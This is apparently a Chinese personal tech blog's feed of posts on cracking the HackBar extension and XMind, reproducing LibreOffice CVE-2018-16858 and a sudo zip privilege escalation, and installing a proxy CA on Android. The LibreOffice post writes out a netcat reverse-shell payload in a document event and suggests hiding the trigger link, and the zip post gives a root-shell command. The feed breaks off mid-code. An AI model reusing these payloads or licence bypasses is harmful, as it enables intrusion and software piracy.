      <link href="/posts/eea35710.html"/>
      <url>/posts/eea35710.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://s1.ax1x.com/2020/05/08/YnCX8g.png"></p><a id="more"></a><p>Firefox下x_forwarded_for无法保存设置好的headers</p><h3 id="x-forwarded-for"><a href="#x-forwarded-for" class="headerlink" title="x_forwarded_for"></a>x_forwarded_for</h3><p>从Firefox插件目录，复制x_forwarded_for出来并解压</p><p>编辑 <code>options.js</code> 156行，在newSettings前添加 <code>let</code></p><p><img src="https://s1.ax1x.com/2020/05/08/YnCOPS.png"></p><p>编辑 <code>options.html</code></p><p>删除 163行的 <code>&lt;script src=&quot;browser-polyfill.js&quot;&gt;&lt;/script&gt;</code></p><p><img src="https://s1.ax1x.com/2020/05/08/YnCbUf.png"></p><p>修改 <code>manifest.json</code> 41行的id值，修改为任意值</p><p><img src="https://s1.ax1x.com/2020/05/08/YnCTbt.png"></p><p>删除存 <code>META-INF</code> 整个文件夹</p><p>打包为zip，然后上传到Firefox开发者中心进行签名</p><p>访问 <code>https://addons.mozilla.org/zh-CN/developers/</code> 使用Firefox账号登录（没有账号请自行注册），登录后，提交新附件组件，选【我自己托管】，按提示操作即可。成功提交后，5分钟左右即可下载签名好的插件。</p><p><img src="https://s1.ax1x.com/2020/05/08/YnCq58.png"></p><h3 id="HackBar"><a href="#HackBar" class="headerlink" title="HackBar"></a>HackBar</h3><p>提取 插件并解压，然后编辑 <code>theme\js\hackbar-panel.js</code></p><p>注释 21~25行</p><figure class="hljs highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">disable_hackbar</span>(<span class="hljs-params">message=null</span>) </span>&#123;<br>    <span class="hljs-comment">//$('#alert-license').removeClass('hidden');</span><br>    <span class="hljs-comment">//if(message)&#123;</span><br>    <span class="hljs-comment">//    $('#alert-license span').text(message);</span><br>    <span class="hljs-comment">//&#125;</span><br>    license_ok = <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/05/08/YnCHVP.png"></p><p>删除存 META-INF，重新打包为zip，然后上传到Firefox开发者中心进行签名，签名完下载安装即可。</p><p><img src="https://s1.ax1x.com/2020/05/08/YnCX8g.png"></p><p><strong>Reference</strong></p><p><a href="https://www.bilibili.com/video/BV1j4411X7Ep?from=search&amp;seid=13023994289158065445" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1j4411X7Ep?from=search&amp;seid=13023994289158065445</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术水文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cracked </tag>
            
            <tag> HackBar </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>隐藏Chrome书签栏</title>
      <link href="/posts/3ca0a42e.html"/>
      <url>/posts/3ca0a42e.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://ae01.alicdn.com/kf/H7b8f123b3b7c429ea12026ac5ba07e60Y.jpg"></p><a id="more"></a><h3 id="隐藏Chrome顶部的书签栏有方式"><a href="#隐藏Chrome顶部的书签栏有方式" class="headerlink" title="隐藏Chrome顶部的书签栏有方式###"></a>隐藏Chrome顶部的书签栏有方式###</h3><ul><li>1、使用官方说的：<code>Ctrl+Shift+B</code></li><li>2、Chrome扩展</li><li>3、修改注册表</li></ul><p>对于第1、2两种没什么可说的，只是“临时性”隐藏，且，只对正在浏览页面标签页有效，打开新的标签页还是可以看到，治标不治本。</p><p>比较治本的就是第3种–修改注册表</p><h3 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h3><p>打开注册表 <code>HKEY_LOCAL_MACHINE\SOFTWARE\Policies</code> 项，新建一个 <code>Google</code>项，然后其再创建子项 <code>Chrome</code>，最后创建一个名为 <code>BookmarkBarEnabled</code> 的 DWORD(32位值)，数值默认为0就行，重新打开Chrome即可。</p><h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><p>书签栏隐藏后</p><ul><li>可以在Chrome的菜单选项进入书签（不是很方便，但可以接受）</li><li>菜单选项会多出一个【由贵单位管理】</li></ul>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Chrome </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows privileged</title>
      <link href="/posts/1143e85d.html"/>
      <url>/posts/1143e85d.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://ae01.alicdn.com/kf/H3d8d7218658f418d9326f5b2147f9119C.png"></p><a id="more"></a><h3 id="Foreword"><a href="#Foreword" class="headerlink" title="Foreword"></a>Foreword</h3><p>很长一段时间没关注tw了，翻了翻推文，发现一则【windows提权大杀器】的推文？慢悠悠的点击看了推文与文中的截图： <code>ctftool.exe</code> 第一眼看到ctf字样，脑中闪现：CTF比赛的产物？</p><p><img src="https://ae01.alicdn.com/kf/H3d8d7218658f418d9326f5b2147f9119C.png"></p><p>后面翻了翻这“大杀器”作者的blog<a href="https://googleprojectzero.blogspot.com/2019/08/down-rabbit-hole.html" target="_blank" rel="noopener">文章</a>，CTF疑似微软的某种协议简写。(Google搜了一遍，没找到CTF协议具体是什么，咱啥也没明白，啥也不敢问，只是知道该协议有漏洞，可被利用进行提权)</p><h3 id="D"><a href="#D" class="headerlink" title=";D"></a>;D</h3><p>复现利用</p><p><code>https://github.com/taviso/ctftool</code></p><p>按作者readme中的描述，他是使用 vs 2019 与 GUI make 构建的 <code>ctftool</code> 。这两样自己机子都装有，vs 2017版应该也可以吧，然后就屁颠屁颠的去下载源码尝试自己构建。一构建一大推的报错，然后，然后，然后瞬间放弃直接del了，还是去下载作者编译好的吧。。。。。</p><p>运行 <code>ctftoll.exe</code> 执行脚本</p><p><img src="https://ae01.alicdn.com/kf/H41f72b7ba8e24bf38dd0a552cb71a5286.png"></p><p>后面重复测试，发现自安全软件已加入指纹库了。。。。。</p><p><img src="https://ae01.alicdn.com/kf/H2498e3e2f18347728ea51e49ac6fa85aB.png"></p><h3 id="Video"><a href="#Video" class="headerlink" title="Video"></a>Video</h3><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=65238139&bvid=BV1u4411k7Wh&cid=113228058&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;"></iframe></div><p><strong>Reference</strong></p><p><a href="https://github.com/taviso/ctftool" target="_blank" rel="noopener">https://github.com/taviso/ctftool</a></p><p><a href="https://googleprojectzero.blogspot.com/2019/08/down-rabbit-hole.html" target="_blank" rel="noopener">https://googleprojectzero.blogspot.com/2019/08/down-rabbit-hole.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> vuln </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>思维导图软件--XMind</title>
      <link href="/posts/ba174219.html"/>
      <url>/posts/ba174219.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://ae01.alicdn.com/kf/Hadf02e78dcc242b39a8c22001291d860G.png"></p><a id="more"></a><h3 id="D"><a href="#D" class="headerlink" title=";D"></a>;D</h3><p>XMind是一款个人觉得还不错的维导图软件，但它是商业软件要收费的，而且还有点“小贵”。。。。购买是不可能的；D</p><p><img src="https://ae01.alicdn.com/kf/H0f5ca842d94344ad88734f13b27d19763.png"></p><p>网上搜到的激活码用在XMind官网下载的<code>xmind-8-update8</code>上是用不了的，应该是新版的已经修复了，所以只能用旧版的:<code>xmind-8-update7</code></p><p>Download旧版安装包，激活插件，key<br>github：<a href="https://github.com/Kuibagit/Resource/blob/master/XMind_Crack.zip" target="_blank" rel="noopener">https://github.com/Kuibagit/Resource/blob/master/XMind_Crack.zip</a> （压缩包已损坏）<br>百度云：<a href="https://pan.baidu.com/s/1h6wCRnBomNE5Btr2sB4qyQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1h6wCRnBomNE5Btr2sB4qyQ</a> 提取码：bzrg </p><p>下载解压安装，然后把<code>XMindCrack.jar</code>复制到XMind安装的目录下并在<code>XMind.ini</code>添加jar路径，如：</p><figure class="hljs highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">-javaagent:C:<span class="hljs-symbol">\P</span>rogram Files (x86)<span class="hljs-symbol">\X</span>Mind<span class="hljs-symbol">\X</span>MindCrack.jar<br></code></pre></td></tr></table></figure><p>最后在host文件添加解析：</p><figure class="hljs highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">0.0.0.0</span> xmind.net<br><span class="hljs-number">0.0.0.0</span> www.xmind.net<br><span class="hljs-number">0.0.0.0</span> xmind.cn<br><span class="hljs-number">0.0.0.0</span> www.xmind.cn<br></code></pre></td></tr></table></figure><p><strong>END</strong></p><p>唔，后面就是打开软件输入序列号，序列号在<code>key.txt</code>，邮箱可随便填，只要是邮箱格式就行。</p><p><img src="https://ae01.alicdn.com/kf/H777b921afcf045b9a7d1341a909487beX.png"></p><p><strong>Reference</strong></p><p><a href="https://blog.csdn.net/m0_37447148/article/details/81167700" target="_blank" rel="noopener">https://blog.csdn.net/m0_37447148/article/details/81167700</a></p>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
          <category> 转载搬运 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Xmind </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>libreoffice命令执行复现</title>
      <link href="/posts/cdf8e41e.html"/>
      <url>/posts/cdf8e41e.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://s2.ax1x.com/2019/07/13/Z4drIs.jpg"></p><a id="more"></a><h3 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h3><p>打开Libreoffice writer新建个’word’:</p><p>插入(Insert) =&gt; 超链接(Hyperlink) =&gt; 设置(图标)，添加个鼠标事件，保存为odt文档:</p><p><img src="https://s2.ax1x.com/2019/07/13/Z4NnxS.png"></p><p>使用解压工具解压/查看odt文件，把<code>content.xml</code>拖出来,看下里面有什么内容。</p><p><img src="https://s2.ax1x.com/2019/07/13/Z4NKKg.png"></p><p>可以看到这是类似一个加载本地的一个脚本然后使用python运行的。</p><figure class="hljs highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">&lt;<span class="hljs-keyword">scrip</span><span class="hljs-variable">t:event</span>-listener <span class="hljs-keyword">scrip</span><span class="hljs-variable">t:language</span>=<span class="hljs-string">"ooo:script"</span> <span class="hljs-keyword">scrip</span><span class="hljs-variable">t:event</span>-name=<span class="hljs-string">"dom:mouseover"</span> xlink:href=<span class="hljs-string">"vnd.sun.star.script:pythonSamples|TableSample.py$createTable?language=Python&amp;amp;location=share"</span> xlink:<span class="hljs-built_in">type</span>=<span class="hljs-string">"simple"</span>/&gt;<br></code></pre></td></tr></table></figure><p>作者文章中写到：Libreoffice自带有Python和预装部分脚本，还可以通过目录遍历访问(调用)其他脚本。</p><p>在<code>LibreOffice\program\python-core-3.5.5\lib\</code>中的<code>pydoc.py</code>通过参数cmd传递给<code>os.system()</code>执行，而且还没有做过滤。</p><p><img src="https://s2.ax1x.com/2019/07/13/Z4Nm28.png"></p><p>So，通过修改<code>content.xml</code>内容重新压缩回odt文件，当打开odt文件鼠标碰到超链接是，就会触发反弹shell。</p><figure class="hljs highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">&lt;<span class="hljs-keyword">scrip</span><span class="hljs-variable">t:event</span>-listener <span class="hljs-keyword">scrip</span><span class="hljs-variable">t:language</span>=<span class="hljs-string">"ooo:script"</span> <span class="hljs-keyword">scrip</span><span class="hljs-variable">t:event</span>-name=<span class="hljs-string">"dom:mouseover"</span> xlink:href=<span class="hljs-string">"vnd.sun.star.script:../../../program/python-core-3.5.5/lib/pydoc.py$tempfilepager(1, nc -e /bin/bash 127.0.0.1 12345)?language=Python&amp;amp;location=share"</span> xlink:<span class="hljs-built_in">type</span>=<span class="hljs-string">"simple"</span>/&gt;<br></code></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/07/13/Z4Ne8f.png"></p><h3 id="Video"><a href="#Video" class="headerlink" title="Video"></a>Video</h3><div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe src="//player.bilibili.com/player.html?aid=63298083&bvid=BV1c4411Q7KM&cid=109925123&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; left: 0; top: 0;"></iframe></div><h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><p>为了增加触发率，可以设置超链接为白色并遍布整个页面</p><p>新版中，python鼠标事件好像已被移除</p><p><strong>Reference</strong></p><p><a href="https://insert-script.blogspot.com/2019/02/libreoffice-cve-2018-16858-remote-code.html" target="_blank" rel="noopener">https://insert-script.blogspot.com/2019/02/libreoffice-cve-2018-16858-remote-code.html</a></p><p><a href="https://testofpen.wordpress.com/2019/05/13/cve-2018-16858/" target="_blank" rel="noopener">https://testofpen.wordpress.com/2019/05/13/cve-2018-16858/</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> libreoffice </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用Python给(blog)图片加上自己的水印</title>
      <link href="/posts/ba9aa5f5.html"/>
      <url>/posts/ba9aa5f5.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://s2.ax1x.com/2019/07/02/ZYmNqI.png"></p><a id="more"></a><p>原文：<strong>州的先生</strong> 使用Python编写批量添加图片水印程序：一、代码方案 <a href="https://zmister.com/archives/990.html" target="_blank" rel="noopener">https://zmister.com/archives/990.html</a></p><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>1、备好自己要加的水印图片，可以用PS制作或者网上找自己喜欢的。</p><p>2、待加水印图片</p><p>3、编写以下代码</p><figure class="hljs highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os, traceback<br><span class="hljs-comment"># from operator import lt</span><br><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br><br><span class="hljs-comment"># 获取文件夹图片</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_folder</span><span class="hljs-params">(fpath, wm_file, save_path)</span>:</span><br>    <span class="hljs-keyword">try</span>:<br>        img_suffix_list = [<span class="hljs-string">'png'</span>, <span class="hljs-string">'jpg'</span>, <span class="hljs-string">'bmp'</span>]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> os.listdir(fpath):<br>            <span class="hljs-keyword">if</span> i.split(<span class="hljs-string">'.'</span>)[<span class="hljs-number">-1</span>] <span class="hljs-keyword">in</span> img_suffix_list:<br>                img_path = fpath + <span class="hljs-string">'/'</span> + i<br>                img_water_mark(img_file=img_path, wm_file=wm_file, save_path=save_path)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        print(traceback.print_exc())<br><br><br><span class="hljs-comment"># 图片添加水印</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">img_water_mark</span><span class="hljs-params">(img_file, wm_file, save_path)</span>:</span><br>    <span class="hljs-keyword">try</span>:<br>        img = Image.open(img_file)  <span class="hljs-comment"># 打开图片</span><br>        watermark = Image.open(wm_file)  <span class="hljs-comment"># 打开水印</span><br>        img_size = img.size<br>        wm_size = watermark.size<br>        <span class="hljs-comment"># print(wm_size)</span><br><br>        <span class="hljs-comment"># 如果图片大小小于水印大小</span><br>        <span class="hljs-comment"># if img_size[0] &amp; lt &amp; wm_size[0]:</span><br>        watermark.resize(tuple(map(<span class="hljs-keyword">lambda</span> x: int(x * <span class="hljs-number">0.5</span>), watermark.size)))<br>        print(<span class="hljs-string">'图片大小：'</span>, img_size)<br>        wm_position = (img_size[<span class="hljs-number">0</span>] - wm_size[<span class="hljs-number">0</span>], img_size[<span class="hljs-number">1</span>] - wm_size[<span class="hljs-number">1</span>])  <span class="hljs-comment"># 默认设定水印位置为右下角</span><br>        layer = Image.new(<span class="hljs-string">'RGBA'</span>, img.size)  <span class="hljs-comment"># 新建一个图层</span><br>        layer.paste(watermark, wm_position)  <span class="hljs-comment"># 将水印图片添加到图层上</span><br>        mark_img = Image.composite(layer, img, layer)<br>        new_file_name = <span class="hljs-string">'/new_'</span> + img_file.split(<span class="hljs-string">'/'</span>)[<span class="hljs-number">-1</span>]<br>        mark_img.save(save_path + new_file_name)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        print(traceback.print_exc())<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:<br>    print(<span class="hljs-string">"正在合成，请稍等......"</span>)<br>    get_folder(fpath=<span class="hljs-string">r"D:\Pychram\blogo\sourceimg"</span>, wm_file=<span class="hljs-string">r"D:\Pychram\blogo\save.png"</span>, save_path=<span class="hljs-string">r"D:\Pychram\blogo\sava"</span>)<br>    print(<span class="hljs-string">"合成完成~"</span>)<br></code></pre></td></tr></table></figure><p>加上水印后</p><p><img src="https://s2.ax1x.com/2019/07/02/ZYmWd0.png"></p><h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><p>原作者写的代码中，是有个判断图片是否小于水印图片，这里我把其注释了，因为在自己的环境上代码跑不起来。。。。。</p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用ZIP进行提权</title>
      <link href="/posts/c80808d5.html"/>
      <url>/posts/c80808d5.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://ae01.alicdn.com/kf/HTB1F0_Ob8GE3KVjSZFh763kaFXaa.png"></p><a id="more"></a><p>今天看到一则推文：在linux中使用zip可以低权限用户提升为高权限。</p><p>当使用高权限运行时，zip的执行会发生变化。假设系统管理员已向普通用户授予sudo权限以运行zip，可导致低权限用户提升为高权限。</p><h3 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h3><ul><li>安装有zip(一般情况都装有)</li><li>允许本地用户已sudo权限运行zip</li></ul><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>创建一个普通用户 <code>test</code>，并设置允许以<code>sudo</code>权限运行zip。</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">useradd -m <span class="hljs-built_in">test</span><br>passwd <span class="hljs-built_in">test</span><br>vi /etc/sudoers<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB14MPNb.GF3KVjSZFv762_nXXaV.png"></p><p>ssh登录<code>test</code></p><p><img src="https://ae01.alicdn.com/kf/HTB1Ct_Ob8GE3KVjSZFh763kaFXaw.png"></p><p>touch一个txt文件(任意)，然后使用<code>-T</code>选项并用<code>--unzip-command</code>（调用命令），进行文件压缩。</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">touch fu.txt<br>sudo zip r.zip fu.txt -T --unzip-command=<span class="hljs-string">"bash -c /bin/bash"</span><br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB11s_VbW1s3KVjSZFA760_ZXXaw.png"></p><h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><p>复现完这个，觉得好鸡肋。。。</p><p>这其实还是”使用” <code>sudo</code> 方式进行提权的，现在基本没有管理员会把普通用户加入到<code>sudoers</code>文件中了吧。</p><p><strong>Reference</strong></p><p><a href="https://www.hackingarticles.in/linux-for-pentester-zip-privilege-escalation/" target="_blank" rel="noopener">https://www.hackingarticles.in/linux-for-pentester-zip-privilege-escalation/</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> ZIP Privilege Escalation </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android安装根证书到系统</title>
      <link href="/posts/84477c27.html"/>
      <url>/posts/84477c27.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://ae01.alicdn.com/kf/HTB13y5aaEWF3KVjSZPhq6xclXXa2.jpg"></p><a id="more"></a><p>update：2021-06-26 </p><p>1、如还是无法抓到数据包，则安装低版本微信(v7.0.22)或许可行。</p><p>2、现在openssl 版本基本是大于1.0版本的，所以文件名应该为： <code>9a5ba575.0</code> 。</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近公司有小程序要测试，Burpsuite无法抓到数据包，https证书已经安装了，还是无法捉到数据包。<br>Google找到一下文章 <a href="https://testerhome.com/topics/17746" target="_blank" rel="noopener" title="安卓微信 7.0 不能抓 https">安卓微信7.0不能抓 https</a>。</p><p>微信不再信任Android 7及之后用户安装的证书，可是我用的是Android 5.1的咋也不能正常捉包呢，不管了。手机刚好有root权限，那就把证书安到系统下试试。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>步骤分为：<br>1、从Brupsuite中导出证书文件 <code>cert.der</code><br>2、使用Openssl生成pem文件(这里我把ca证书复制到kali操作，Windows可安装 <a href="https://git-scm.com/downloads" target="_blank" rel="noopener">Git Bahs</a>，自带Openssl)<br>3、读取取ca证书hash值<br>4、重命名pem文件</p><p>Openssl 版本小于于 1.0 使用以下命令：</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl x509 -<span class="hljs-keyword">in</span> cert.der -inform der -outform pem -out cert.pem<br><br>openssl x509 -inform PEM -subject_hash -<span class="hljs-keyword">in</span> cert.pem | head -1<br><br>cat cert.pem &gt; 7bf17d07.0<br><br>openssl x509 -inform PEM -text -<span class="hljs-keyword">in</span> cert.pem -out /dev/null &gt;&gt; 7bf17d07.0<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1ABOXaxiH3KVjSZPf760BiVXaO.png"></p><p>Openssl 版本大于 1.0 使用以下命令：</p><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">openssl x509 -inform DER -<span class="hljs-keyword">in</span> cacert.der -out cacert.pem<br><br>openssl x509 -inform PEM -subject_hash_old -<span class="hljs-keyword">in</span> cacert.pem | head -1<br><br>mv cacert.pem 9a5ba575.0<br></code></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/30/JqiW5R.png"></p><p>把<code>7bf17d07.0</code> 或 <code>9a5ba575.0</code>  传到到手机上，</p><p>然后再复制到 <code>/system/etc/security/cacerts/</code> 目录下(以下使用RE文件管理器进行操作)，并修改其权限为<code>644</code></p><p><img src="https://ae01.alicdn.com/kf/HTB1qZ9caBWD3KVjSZKP761p7FXaP.png"></p><p>重启手机，ca证书已经安装到系统下，此时就可以正常捉到小程序的数据包了。</p><p><img src="https://ae01.alicdn.com/kf/HTB1pRCXaxiH3KVjSZPf760BiVXaK.png"></p><p><img src="https://i.loli.net/2021/07/11/N8L7qRwxElK94Je.png" alt="2021-06-26_22-29-16.png"></p><p><strong>Reference</strong></p><p><a href="https://testerhome.com/topics/17746" target="_blank" rel="noopener">https://testerhome.com/topics/17746</a><br><a href="https://www.codercto.com/a/71371.html" target="_blank" rel="noopener">https://www.codercto.com/a/71371.html</a><br><a href="http://www.gtopia.org/blog/2010/02/der-vs-crt-vs-cer-vs-pem-certificates/" target="_blank" rel="noopener">http://www.gtopia.org/blog/2010/02/der-vs-crt-vs-cer-vs-pem-certificates/</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术水文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CA证书 </tag>
            
            <tag> Burpsuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初次使用BeautifulSoup(bs4)小记</title>
      <link href="/posts/f939aff4.html"/>
      <url>/posts/f939aff4.html</url>
      
        <content type="html"><![CDATA[<script src="\assets\js\APlayer.min.js"> </script><p><img src="https://ae01.alicdn.com/kf/HTB1rJGdaBGE3KVjSZFhq6AkaFXaN.jpg"></p><a id="more"></a><div class="yinyue" style="text-align:center"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1358800103&auto=1&height=66"></iframe></div><h2 id="Foreword"><a href="#Foreword" class="headerlink" title="Foreword"></a>Foreword</h2><p>某天，逛到了某社区一帖子，发现<a href="http://hongdou.gxnews.com.cn/viewthread-16250447-1.html" target="_blank" rel="noopener">帖子</a>里的妹子图片，嗯还蛮不错的。帖子有7页，每页20张图，要是每张都手动下载，那岂不“累死了”？不存在的，祭出py download it。</p><h2 id="Main-body"><a href="#Main-body" class="headerlink" title="Main body"></a>Main body</h2><p>初次使用BeautifulSoup,代码不入眼，大佬勿喷~</p><p>大体步骤：<br>    1、获取7个页面url<br>    2、获取单个页面里所有图片的url<br>    3、下载所有图片<br>    4、提取文件名并入库保存图片</p><p>代码如下：</p><figure class="hljs highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*-coding: utf-8-*-</span><br><span class="hljs-comment"># _Author: Kuibahd</span><br><span class="hljs-comment"># _Time: 2019/5/14</span><br><br><span class="hljs-keyword">import</span> requests, os, time<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_image</span><span class="hljs-params">()</span>:</span><br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>, <span class="hljs-number">7</span>):<br>        url = <span class="hljs-string">"http://hongdou.gxnews.com.cn/viewthread-16250447-"</span> + str(x) + <span class="hljs-string">".html"</span><br>        print(url)<br>        header = &#123;<br>            <span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 UBrowser/6.1.2107.204 Safari/537.36'</span><br>        &#125;<br>        html = requests.get(url, headers=header)<br>        soup = BeautifulSoup(html.text, <span class="hljs-string">'lxml'</span>)<br>        all_src = soup.find_all(<span class="hljs-string">'div'</span>, class_=<span class="hljs-string">'viewmessage'</span>)<br>        <span class="hljs-comment"># print(all_src[0].img['data-original'])</span><br>        i2 = len(all_src)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, i2):<br>            <span 